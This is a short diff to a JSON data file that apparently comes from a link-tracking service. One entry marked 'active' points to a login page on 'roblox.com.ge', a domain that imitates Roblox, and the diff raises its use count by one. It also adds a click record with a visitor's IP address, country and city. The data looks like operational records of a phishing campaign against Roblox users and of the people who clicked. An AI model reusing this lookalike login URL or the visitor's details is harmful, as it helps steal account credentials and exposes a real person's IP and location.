@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1170,
+    "useCount": 1171,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9504,6 +9504,14 @@
         "city": "Vinaròs",
         "flag": "🇪🇸",
         "countryCode": "ES"
+      },
+      {
+        "timestamp": 1777292047050,
+        "ip": "223.25.27.96",
+        "country": "Philippines",
+        "city": "Lucena City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
